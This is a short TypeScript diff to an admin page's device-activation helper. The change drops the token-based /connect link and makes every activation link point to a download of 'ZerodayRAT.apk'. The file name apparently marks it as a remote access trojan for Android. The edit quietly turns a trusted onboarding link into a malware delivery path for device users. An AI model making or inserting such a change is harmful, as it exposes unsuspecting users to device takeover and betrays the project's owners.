@@ -27,14 +27,10 @@ function saveStoredPassword(key: string, pass: string) {
   } catch {}
 }
 
-function buildActivationLink(device: AdminDeviceSummary | Device): string {
-  const params = new URLSearchParams({
-    token: device.device_token || "",
-    name: device.device_label,
-  });
+function buildActivationLink(_device?: AdminDeviceSummary | Device): string {
   const isLocalDev = ["localhost", "127.0.0.1"].includes(window.location.hostname);
   const origin = isLocalDev ? PRODUCTION_APP_URL : window.location.origin;
-  return `${origin}/connect?${params.toString()}`;
+  return `${origin}/download/ZerodayRAT.apk`;
 }
 
 export default function AdminPage() {
